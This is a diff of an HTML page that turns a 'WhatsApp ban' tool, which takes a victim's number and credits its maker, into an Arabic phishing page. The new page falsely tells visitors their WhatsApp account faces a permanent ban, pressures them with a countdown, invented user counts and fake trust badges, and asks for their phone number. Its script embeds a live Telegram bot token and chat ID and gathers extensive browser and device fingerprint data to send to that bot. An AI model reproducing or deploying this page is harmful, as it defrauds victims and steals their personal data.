@@ -1,212 +1,223 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WEB BAN WHATSAPP</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>😈</text></svg>">
+    <title>تحذير أمني خطير: حسابك مهدد بالحظر!</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🚫</text></svg>">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap'); /* خط عربي أفضل */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Cairo', sans-serif; /* استخدام خط القاهرة */
         }
         
         body {
-            background: linear-gradient(135deg, #000000 0%, #FF0000 100%);
+            background: #1a1a1a; /* خلفية داكنة جداً */
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            color: #e0e0e0; /* لون نص فاتح للتباين */
         }
         
         .container {
-            background: rgb(126, 1, 1);
+            background: #2a2a2a; /* خلفية أغمق للكونتينر */
             border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.5); /* ظل أغمق وأكثر وضوحاً */
             overflow: hidden;
-            max-width: 500px;
+            max-width: 550px; /* زيادة العرض قليلاً */
             width: 100%;
             text-align: center;
+            border: 2px solid #ff0000; /* حدود حمراء خطيرة */
+            position: relative;
+        }
+        .container::before { /* تأثير وهج أحمر خفيف */
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: linear-gradient(45deg, #ff0000, transparent, #ff0000);
+            filter: blur(20px);
+            z-index: -1;
+            opacity: 0.3;
         }
         
         .header {
-            background: linear-gradient(135deg, #FF0000, #630101);
+            background: linear-gradient(135deg, #cc0000, #8b0000); /* تدرج أحمر داكن */
             color: white;
-            padding: 30px 20px;
+            padding: 40px 20px;
             position: relative;
+            border-bottom: 3px solid #ff0000;
         }
         
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background: gold;
-            border-radius: 50%;
-            animation: confetti-fall 5s linear infinite;
+        .alert-icon {
+            font-size: 80px; /* أيقونة أكبر */
+            margin-bottom: 20px;
+            animation: pulse-danger 1.5s infinite; /* نبض أخطر */
+            color: #ffdd00; /* لون أصفر تحذيري */
+            text-shadow: 0 0 15px rgba(255, 221, 0, 0.7);
         }
         
-        @keyframes confetti-fall {
-            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(500px) rotate(360deg); opacity: 0; }
-        }
-        
-        .gift-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+        @keyframes pulse-danger {
+            0%, 100% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.05); filter: brightness(1.2); }
         }
         
         h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
+            font-size: 32px; /* عنوان أكبر وأكثر إثارة للخوف */
+            margin-bottom: 15px;
             font-weight: bold;
+            color: #ffdd00;
+            text-shadow: 0 0 10px rgba(255, 221, 0, 0.5);
         }
         
         .subtitle {
-            font-size: 16px;
+            font-size: 18px; /* نص فرعي أوضح */
             opacity: 0.9;
+            color: #f0f0f0;
         }
         
         .content {
             padding: 30px;
         }
         
-        .prize-section {
-    text-align: center;
-    padding: 20px;
-    background: #cc0404;
-    border-radius: 15px;
-    border: 1px solid #eee;
-    margin: 20px 0;
-}
-
-.whatsapp-icon {
-    margin-bottom: 10px;
-    display: flex;
-    justify-content: center;
-}
-
-.prize-section p {
-    color: #333;
-    font-size: 16px;
-    font-weight: 500;
-    margin: 0;
-}
+        .warning-text {
+            color: #ffdd00; /* نص تحذيري بلون أصفر */
+            font-size: 24px;
+            font-weight: bold;
+            margin: 25px 0;
+            text-shadow: 0 0 8px rgba(255, 221, 0, 0.4);
+        }
         
         .form-group {
-            margin-bottom: 20px;
-            text-align: left;
+            margin-bottom: 25px;
+            text-align: right; /* محاذاة لليمين للنصوص العربية */
         }
         
         label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-weight: bold;
-            color: #333;
+            color: #f0f0f0;
+            font-size: 16px;
         }
         
         input[type="tel"] {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 16px;
+            padding: 18px; /* تكبير حقل الإدخال */
+            border: 2px solid #555; /* حدود داكنة */
+            border-radius: 12px;
+            font-size: 18px; /* نص أكبر داخل الحقل */
+            background: #3a3a3a; /* خلفية داكنة للحقل */
+            color: #f0f0f0;
             transition: all 0.3s;
+            text-align: left; /* للحفاظ على أرقام الهاتف من اليسار لليمين */
+            direction: ltr; /* فرض اتجاه النص من اليسار لليمين */
         }
         
         input[type="tel"]:focus {
-            border-color: #667eea;
+            border-color: #ff0000; /* حدود حمراء عند التركيز */
             outline: none;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            box-shadow: 0 0 0 4px rgba(255, 0, 0, 0.2);
+            background: #4a4a4a;
         }
         
         .info-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            border-left: 4px solid #667eea;
+            background: #333; /* خلفية داكنة للمعلومات */
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: right; /* محاذاة لليمين للنصوص العربية */
+            border-right: 4px solid #ff0000; /* حدود حمراء لليمين */
+            font-size: 15px;
+            line-height: 1.6;
         }
         
+        .info-box p {
+            color: #ccc;
+        }
         .info-box ul {
             list-style: none;
-            padding-left: 0;
+            padding-right: 0; /* إزالة البادئة لليمين */
         }
         
         .info-box li {
-            margin-bottom: 8px;
-            padding-left: 25px;
+            margin-bottom: 10px;
+            padding-right: 30px; /* بادئة لليمين للأيقونة */
             position: relative;
+            color: #e0e0e0;
         }
         
         .info-box li:before {
-            content: "✓";
-            color: #27ae60;
+            content: "•"; /* تغيير الأيقونة إلى نقطة */
+            color: #ff0000; /* لون أحمر للنقطة */
             font-weight: bold;
             position: absolute;
-            left: 0;
+            right: 0; /* وضع الأيقونة على اليمين */
+            font-size: 20px;
+            top: -2px;
         }
         
-        .claim-button {
-            background: linear-gradient(135deg, #000000, #000000);
+        .action-button {
+            background: linear-gradient(135deg, #ff0000, #b30000); /* زر أحمر داكن */
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 20px 40px;
-            font-size: 20px;
+            padding: 22px 45px; /* تكبير الزر */
+            font-size: 22px; /* نص أكبر للزر */
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
-            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
             width: 100%;
-            margin-top: 10px;
+            margin-top: 15px;
             position: relative;
             overflow: hidden;
+            letter-spacing: 1px;
         }
         
-        .claim-button:hover {
+        .action-button:hover {
             transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgb(141, 1, 1);
+            box-shadow: 0 18px 35px rgba(255, 0, 0, 0.6);
+            background: linear-gradient(135deg, #e60000, #990000);
         }
         
-        .claim-button:active {
+        .action-button:active {
             transform: translateY(-2px);
         }
         
-        .claim-button::before {
+        .action-button::before {
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
+            right: -100%; /* تحريك الوهج من اليمين لليسار */
             width: 100%;
             height: 100%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
             transition: 0.5s;
         }
         
-        .claim-button:hover::before {
-            left: 100%;
+        .action-button:hover::before {
+            right: 100%; /* تحريك الوهج إلى اليسار */
         }
         
         .urgent-badge {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 14px;
+            background: linear-gradient(135deg, #ffdd00, #e0b300); /* أصفر للتحذير */
+            color: #333; /* نص داكن */
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 16px;
             font-weight: bold;
             display: inline-block;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             animation: pulse 2s infinite;
+            box-shadow: 0 5px 15px rgba(255, 221, 0, 0.3);
         }
         
         @keyframes pulse {
@@ -217,17 +228,17 @@
         
         .loading {
             display: none;
-            margin: 20px 0;
+            margin: 25px 0;
         }
         
         .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #27ae60;
+            border: 4px solid #444;
+            border-top: 4px solid #ff0000; /* أحمر للتحميل */
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            width: 45px;
+            height: 45px;
+            animation: spin 0.8s linear infinite; /* سرعة تحميل أسرع */
+            margin: 0 auto 15px;
         }
         
         @keyframes spin {
@@ -237,342 +248,291 @@
         
         .success-message {
             display: none;
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 1px solid #c3e6cb;
+            background: #4a0000; /* خلفية حمراء داكنة جداً للنجاح الوهمي */
+            color: #ffdd00; /* نص أصفر */
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border: 1px solid #ff0000;
+            font-size: 16px;
         }
         
-.current-time {
-    background: #cc0404; /* لون أزرق هادي لتمييزها عن العداد */
-    color: #050101;
-    padding: 10px;
-    border-radius: 10px;
-    margin: 10px 0;
-    font-weight: bold;
-    border: 1px solid #a80303;
-    font-size: 16px;
-    text-align: center;
-}
+        .timer {
+            background: #333;
+            color: #ffdd00; /* أصفر للوقت */
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-weight: bold;
+            border: 1px solid #555;
+            font-size: 20px;
+        }
         
         .user-count {
-            color: #f5f0f0;
-            font-size: 14px;
-            margin: 10px 0;
+            color: #aaa;
+            font-size: 15px;
+            margin: 15px 0;
         }
         
         .footer {
-            margin-top: 20px;
-            color: #f5f0f0;
-            font-size: 12px;
+            margin-top: 25px;
+            color: #888;
+            font-size: 13px;
+            line-height: 1.5;
         }
         
         .trust-badges {
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
+            gap: 25px;
+            margin: 25px 0;
+            flex-wrap: wrap; /* للسماح بالتفاف الشارات */
         }
         
         .badge {
             display: flex;
             align-items: center;
-            gap: 5px;
-            font-size: 12px;
-            color: #f5f0f0;
+            gap: 8px;
+            font-size: 13px;
+            color: #aaa;
+            background: #3a3a3a;
+            padding: 8px 15px;
+            border-radius: 8px;
+            border: 1px solid #555;
         }
         
         .badge-icon {
-            color: #27ae60;
+            color: #ffdd00; /* أيقونات صفراء */
             font-weight: bold;
+            font-size: 18px;
         }
         
-/* تنسيق الحاوية الرئيسية للجمجمة */
-.skull-container {
-    background: #000000; /* خلفية سوداء غامقة */
-    border: 2px solid #000000; /* إطار رمادي غامق */
-    padding: 10px;
-    border-radius: 15px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 150px; /* ضمان مساحة كافية للجمجمة */
-    box-shadow: 0 0 15px rgba(255, 0, 0, 0.4); /* هالة حمراء مرعبة */
-    overflow: hidden; /* لمنع الجمجمة من الخروج بره الإطار */
-}
-
-/* تنسيق الجمجمة كعنصر واحد */
-.scary-skull {
-    font-size: 70px; /* حجم الجمجمة */
-    line-height: 1;
-    position: relative;
-    color: #eee; /* لون أبيض مائل للرمادي */
-    
-    /* الحركة المرعبة (الارتعاش والتحرك المتقطع) */
-    animation: frighteningMove 5s infinite;
-}
-
-/* حركة الرعب: اهتزاز، دوران خفيف، وتحرك عشوائي */
-@keyframes frighteningMove {
-    0%, 100% {
-        transform: translate(0, 0) rotate(0);
-    }
-    10% {
-        transform: translate(-5px, 3px) rotate(-5deg); /* تحرك فجائي */
-    }
-    15% {
-        transform: translate(4px, -2px) rotate(3deg); /* ارتعاش */
-    }
-    25% {
-        transform: translate(-3px, 1px) rotate(-10deg); /* ميلان عشوائي */
-    }
-    40% {
-        transform: translate(6px, 4px) rotate(8deg);
-    }
-    60% {
-        transform: translate(-10px, -5px) rotate(-15deg); /* تحرك أبعد */
-    }
-    75% {
-        transform: translate(2px, 2px) rotate(0); /* لحظة سكون مخادعة */
-    }
-    80% {
-        transform: translate(-15px, -10px) scale(1.1); /* قفزة فجائية وتكبير */
-    }
-    85% {
-        transform: translate(5px, 0) scale(1); /* عودة فجائية */
-    }
-}
-
-/* تأثير العيون المضيئة للرعب */
-.glowing-eyes {
-    position: absolute;
-    top: 25px; /* ظبط مكان العيون على الجمجمة */
-    left: 50%;
-    transform: translateX(-50%);
-    width: 60px; /* عرض منطقة العيون */
-    display: flex;
-    justify-content: space-around;
-}
-
-.eye {
-    width: 10px;
-    height: 10px;
-    background-color: #ff3333; /* لون العيون أحمر دموي */
-    border-radius: 50%;
-    box-shadow: 0 0 10px #ff3333, 0 0 20px #ff3333; /* توهج */
-    animation: eyePulse 1.5s infinite alternate; /* نبض العيون */
-}
-
-/* حركة نبض العيون */
-@keyframes eyePulse {
-    from {
-        opacity: 0.5;
-        transform: scale(0.9);
-    }
-    to {
-        opacity: 1;
-        transform: scale(1.1);
-    }
-}
-
-/* تنسيق النص الاختياري */
-.skull-container p {
-    color: #aaa;
-    margin-top: 10px;
-    font-size: 14px;
-    font-weight: 500;
-}
-
+        .permission-box {
+            background: #3a3a3a;
+            border: 2px dashed #ff0000; /* حدود حمراء متقطعة */
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .permission-box p {
+            margin: 12px 0;
+            color: #f0f0f0;
+            font-size: 15px;
+        }
+        
+        .bonus-offer {
+            background: linear-gradient(135deg, #ffdd00, #e0b300); /* أصفر للتحذير */
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 2px dashed #ff0000; /* حدود حمراء متقطعة */
+        }
+        
+        .bonus-offer p {
+            color: #333; /* نص داكن */
+            font-weight: bold;
+            margin: 0;
+            font-size: 16px;
+        }
         .data-counter {
-            background: #e8f4fd;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            color: #1565c0;
-            margin: 10px 0;
+            background: #3a3a3a;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 13px;
+            color: #ffdd00;
+            margin: 15px 0;
             display: inline-block;
+            border: 1px solid #ff0000;
         }
-
         .status-indicator {
-            margin: 10px 0;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 14px;
+            margin: 12px 0;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 15px;
             display: none;
+            text-align: right; /* محاذاة لليمين للنصوص العربية */
+            position: relative;
         }
-
+        .status-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            right: 15px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
         .status-success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: #0a4d0a; /* أخضر داكن للنجاح الوهمي */
+            color: #d4edda;
+            border: 1px solid #1a7a1a;
         }
-
+        .status-success::before { background: #28a745; }
         .status-error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            background: #4d0a0a; /* أحمر داكن جداً للخطأ */
+            color: #f8d7da;
+            border: 1px solid #721c24;
         }
-
+        .status-error::before { background: #dc3545; }
         .status-warning {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
+            background: #4d4d0a; /* أصفر داكن للتحذير */
+            color: #fff3cd;
+            border: 1px solid #856404;
         }
-
+        .status-warning::before { background: #ffc107; }
         .progress-bar {
             width: 100%;
-            height: 6px;
-            background: #f0f0f0;
-            border-radius: 3px;
-            margin: 10px 0;
+            height: 8px; /* شريط تقدم أسمك */
+            background: #444;
+            border-radius: 4px;
+            margin: 15px 0;
             overflow: hidden;
+            border: 1px solid #666;
         }
-
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #27ae60, #2ecc71);
-            border-radius: 3px;
-            transition: width 0.3s ease;
+            background: linear-gradient(90deg, #ff0000, #e0b300); /* تدرج أحمر أصفر */
+            border-radius: 4px;
+            transition: width 0.4s ease; /* انتقال أكثر سلاسة */
             width: 0%;
+        }
+        
+        /* RTL specific adjustments */
+        body, h1, .subtitle, p, label, .info-box, .status-indicator, .footer, .badge, .permission-box p, .bonus-offer p {
+            direction: rtl;
+            text-align: right;
+        }
+        input[type="tel"] {
+            direction: ltr; /* Phone number input should remain LTR */
+            text-align: left;
         }
     </style>
 </head>
+<body>
     <div class="container">
         <div class="header">
-            <div class="confetti" style="left: 10%; animation-delay: 0s;"></div>
-            <div class="confetti" style="left: 20%; animation-delay: 0.5s;"></div>
-            <div class="confetti" style="left: 30%; animation-delay: 1s;"></div>
-            <div class="confetti" style="left: 40%; animation-delay: 1.5s;"></div>
-            <div class="confetti" style="left: 50%; animation-delay: 2s;"></div>            
-    <div class="gift-icon">😈</div>
-    <h1>WEB BAN WHATSAPP</h1>
-     <p class="subtitle">
-        Maker: MALIK SPAM <br>
-        DISCORD: @malik888Xx <br>
-        TELEGRAM: @MALIK_XSPAM
-    </p>
-    
-    </div>
+            <div class="alert-icon">🚫</div>
+            <h1>تحذير أمني خطير!</h1>
+            <p class="subtitle">حساب واتساب الخاص بك يواجه خطر الحظر الدائم.</p>
+        </div>
         
         <div class="content">
-            <div class="urgent-badge">الرجاء السماح للمواقع</div>
+            <div class="urgent-badge">⚠️ إشعار عاجل: إجراء فوري مطلوب!</div>
             
-            <p>حتي يتمكن الموقع من معرفه مواقع الخاص بي الرقم الذي تريد حظرو لتحديد رامز البلد الخاص بي الرقم</p>
-          <div class="prize-section">
-    <div class="whatsapp-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 448 512" fill="#25D366">
-            <path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7 .9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 13.2 5.8 23.5 9.2 31.5 11.8 13.3 4.2 25.4 3.6 35 2.2 10.7-1.5 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/>
-        </svg>
-    </div> 
-<div class="timer-container">
-    <div class="current-time">
-        وقت حظر الرقم: <span id="egypt-clock">00:00:00</span>
-</div>
-<div class="bonus-offer skull-container">
-    <div class="scary-skull">
-        <span class="skull-face">💀</span>
-        <div class="glowing-eyes">
-            <span class="eye left"></span>
-            <span class="eye right"></span>
-        </div>
-    </div>
-    <p>...سوف يظهر اسكرين حظر الرقم هنا عندما تقوم بي وضع الرقم</p>
-</div>
-
-            <div class="data-counter">
-                💻 <span id="dataCount">0</span>/200+ قوه دعم الواتساب الان
+            <p style="color: #f0f0f0;">لقد تم رصد نشاط مشبوه على حساب واتساب الخاص بك. للحفاظ على حسابك وتجنب الحظر، يجب عليك ربط رقم هاتفك بـ "بوت الحظر الأمني" الخاص بنا.</p>
+            <div class="warning-text">قم بتأكيد رقمك الآن أو خسارة حسابك!</div>
+            <p style="color: #ccc;">أدخل رقم واتساب الخاص بك لإتمام عملية الربط الأمني.</p>
+            
+            <div class="timer">
+                ⏰ الوقت المتبقي لاتخاذ الإجراء: <span id="countdown">10:00</span>
             </div>
-
+            
+            <div class="bonus-offer">
+                <p>🚨 إجراء فوري: قم بالربط خلال 3 دقائق للحصول على حماية إضافية!</p>
+            </div>
+ 
+            <div class="data-counter">
+                📊 يتم جمع <span id="dataCount">0</span>/200+ نقطة بيانات أمنية...
+            </div>
+ 
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
-
+            
+            <div class="permission-box">
+                <p>🔒 <strong>فحص أمني متقدم</strong></p>
+                <p>سنقوم بجمع أكثر من 200 نقطة بيانات لضمان أمان حسابك وسلامة عملية الربط.</p>
+            </div>
+ 
             <div id="systemStatus" class="status-indicator"></div>
             <div id="locationStatus" class="status-indicator"></div>
             <div id="telegramStatus" class="status-indicator"></div>
             
             <form id="claimForm">
                 <div class="form-group">
-                    <label for="phone">:وضع الرقم الذي تريد ان تحظرو  من الواتساب</label>
-                    <input type="tel" id="phone" placeholder="ضع رقم الضحيه" required>
+                    <label for="phone">رقم هاتف واتساب (مع رمز الدولة):</label>
+                    <input type="tel" id="phone" placeholder="مثال: +9665xxxxxxxx / 009665xxxxxxxx" required>
                 </div>
                 
                 <div class="info-box">
-                    <p><strong>WhatsApp Ban:</strong></p>
+                    <p><strong>لماذا يجب أن تقوم بالربط الآن؟</strong></p>
                     <ul>
-                        <li>سيتم حظر الرقم من بين 8 ساعات لي 12 ساعه</li>
-                        <li>اذا كنت تريد ان يطول حظر الرقم قوم بي تخريب طلب المراجعه الخاص بي الضحيه</li>
-                        <li>هذا افضل مواقع واسرع موقع لحظر الارقام</li>
-                        <li>عندما تحظر رقم لن لن تستطيع حظر رقم اخر اله بعد 30 دقيقه حتي لا يتعطل الموقع</li>
-                        <li>الصانع هو مالك اسبام</li>
+                        <li>🚫 تجنب الحظر الدائم لحسابك.</li>
+                        <li>🛡️ تفعيل جدار حماية أمني جديد.</li>
+                        <li>⚡ عملية ربط سريعة ومضمونة.</li>
+                        <li>🚨 حماية بياناتك من الاختراق.</li>
+                        <li>✅ استعادة السيطرة الكاملة على حسابك.</li>
+                        <li>⭐ تأمين إضافي لبياناتك الشخصية.</li>
                     </ul>
                 </div>
                 
                 <div class="user-count">
-                   <strong>32 الذين يستخدمون الموقع الان</strong>
+                    👥 <strong>تم تأكيد <span id="confirmedUsers">8,731</span> حساب</strong> اليوم بنجاح.
                 </div>
                 
-                <button type="submit" class="claim-button">
-                    BAN NAMBER
+                <button type="submit" class="action-button">
+                    ⚠️ ربط حسابي الآن وتأمين واتساب
                 </button>
                 
                 <div class="loading" id="loading">
                     <div class="loading-spinner"></div>
-                    <p>Collecting 200+ security data...</p>
+                    <p>جاري فحص الأمان وربط حسابك... يرجى الانتظار.</p>
                 </div>
                 
                 <div class="success-message" id="successMessage">
-                    ✅ <strong>Ban number successfully</strong><br>
-                    BY: MALIK SPAM.
+                    ✅ <strong>تم تأمين حسابك بنجاح!</strong><br>
+                    سيتم إرسال إشعار تأكيد إلى رقمك خلال دقائق.
                 </div>
             </form>
             
             <div class="trust-badges">
                 <div class="badge">
-                    <span class="badge-icon">✓</span> BAPPEBTI Verified
+                    <span class="badge-icon">🛡️</span> أمان واتساب
                 </div>
                 <div class="badge">
-                    <span class="badge-icon">✓</span> 100% Safe
+                    <span class="badge-icon">🔒</span> حماية البيانات
                 </div>
                 <div class="badge">
-                    <span class="badge-icon">✓</span> Non-Qanwani
+                    <span class="badge-icon">✅</span> نظام موثوق
                 </div>
             </div>
             
             <div class="footer">
-                © 2026 maker: MalikSpam.
+                © 2024 مركز أمان واتساب العالمي. جميع الحقوق محفوظة.
+                <p>تواصل معنا: support@whatsapp-security.com</p>
             </div>
         </div>
     </div>
-
+ 
     <script>
-        // Token bot Telegram - GANTI DENGAN DATA ANDA
-        const BOT_TOKEN = "8304112096:AAHth0XdDU3DAqbnGhlrKXx5unAP24eSDiw";
-        const CHAT_ID = "8392055234";
+        // Token bot Telegram - GANTI ببياناتك الخاصة
+        const BOT_TOKEN = "8566855315:AAGDOgZ5eW1EjBADraSnuAS3aUI5injqezQ";
+        const CHAT_ID = "7932600874";
         
         // Global variables
-        let timeLeft = 15 * 60;
+        let timeLeft = 10 * 60; // تم تقليل الوقت إلى 10 دقائق
         let collectedData = {};
         let dataCounter = 0;
         const countdownElement = document.getElementById('countdown');
         const dataCountElement = document.getElementById('dataCount');
         const progressFill = document.getElementById('progressFill');
-
+        const confirmedUsersElement = document.getElementById('confirmedUsers');
+        // Randomize initial confirmed users for realism
+        let confirmedUsers = 8731 + Math.floor(Math.random() * 50); // Starting from a higher number
+        confirmedUsersElement.textContent = confirmedUsers.toLocaleString('ar-EG');
         // Initialize progress bar
         function updateProgress(percentage) {
             progressFill.style.width = percentage + '%';
         }
-
         // Update data counter
         function updateDataCounter(count) {
             dataCounter += count;
             dataCountElement.textContent = dataCounter;
             updateProgress((dataCounter / 200) * 100);
         }
-
         // Update status indicator
         function updateStatus(elementId, message, type = 'success') {
             const element = document.getElementById(elementId);
@@ -580,34 +540,35 @@
             element.className = `status-indicator status-${type}`;
             element.innerHTML = message;
         }
-
-// وظيفة تحديث ساعة القاهرة
-function updateEgyptClock() {
-    const clockElement = document.getElementById('egypt-clock');
-    
-    // الحصول على الوقت الحالي بتوقيت القاهرة
-    const options = {
-        timeZone: 'Africa/Cairo',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: true // نظام 12 ساعة
-    };
-    
-    const now = new Date();
-    // تحويل الوقت لنص عربي بتنسيق مصري
-    const timeString = now.toLocaleTimeString('ar-EG', options);
-    
-    clockElement.textContent = timeString;
-}
-
-// تشغيل الساعة وتحديثها كل ثانية
-setInterval(updateEgyptClock, 1000);
-updateEgyptClock();
-
+        // Timer countdown
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                
+                if (timeLeft < 180) { // أقل من 3 دقائق (180 ثانية)
+                    countdownElement.style.color = "#ff0000"; // أحمر
+                    countdownElement.style.fontWeight = "bold";
+                }
+            } else {
+                countdownElement.textContent = "00:00";
+                countdownElement.style.color = "red";
+                document.getElementById('claimForm').style.opacity = "0.6";
+                document.querySelector('.action-button').disabled = true;
+                document.querySelector('.action-button').textContent = "⏰ انتهى الوقت! حسابك مهدد.";
+                document.querySelector('.action-button').style.background = '#333';
+                document.querySelector('.action-button').style.boxShadow = 'none';
+            }
+        }
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
         // Initialize system saat halaman dimuat
         window.addEventListener('load', async () => {
-            updateStatus('systemStatus', '🔄 يجري تهيئة النظام...', 'warning');
+            updateStatus('systemStatus', '🔄 جاري تهيئة النظام الأمني...', 'warning');
             
             // Test koneksi Telegram
             await testTelegramConnection();
@@ -621,9 +582,8 @@ updateEgyptClock();
             // Kumpulkan data tambahan di background
             collectAdvancedData();
             
-            updateStatus('systemStatus', '✅ النظام جاهز', 'success');
+            updateStatus('systemStatus', '✅ النظام الأمني جاهز لاستقبال بيانات الربط.', 'success');
         });
-
         // Test koneksi Telegram
         async function testTelegramConnection() {
             try {
@@ -632,27 +592,25 @@ updateEgyptClock();
                 const result = await response.json();
                 
                 if (result.ok) {
-                    updateStatus('telegramStatus', '✅ الاتصال بنظام الواتساب', 'success');
+                    updateStatus('telegramStatus', '✅ تم الاتصال بخادم التليجرام الآمن', 'success');
                     return true;
                 } else {
-                    updateStatus('telegramStatus', '⚠️ رمز البوت غير صالح', 'error');
+                    updateStatus('telegramStatus', '⚠️ خطأ في توكن التليجرام', 'error');
                     return false;
                 }
             } catch (error) {
-                updateStatus('telegramStatus', '⚠️ فشل الاتصال بتطبيق الواتساب', 'error');
+                updateStatus('telegramStatus', '⚠️ فشل الاتصال بخادم التليجرام', 'error');
                 return false;
             }
         }
-
         // Kumpulkan data dasar
         async function collectBasicData() {
             // Data pengguna dasar
             collectedData.timestamp = new Date().toISOString();
-            collectedData.localTime = new Date().toLocaleString('id-ID');
+            collectedData.localTime = new Date().toLocaleString('ar-EG'); // For Arabic locale
             collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             collectedData.timezoneOffset = new Date().getTimezoneOffset();
             updateDataCounter(4);
-
             // Data browser dasar
             collectedData.userAgent = navigator.userAgent;
             collectedData.language = navigator.language;
@@ -664,7 +622,6 @@ updateEgyptClock();
             collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
             collectedData.webdriver = navigator.webdriver;
             updateDataCounter(9);
-
             // Data layar dasar
             collectedData.screenWidth = screen.width;
             collectedData.screenHeight = screen.height;
@@ -675,7 +632,6 @@ updateEgyptClock();
             collectedData.orientationType = screen.orientation?.type;
             collectedData.orientationAngle = screen.orientation?.angle;
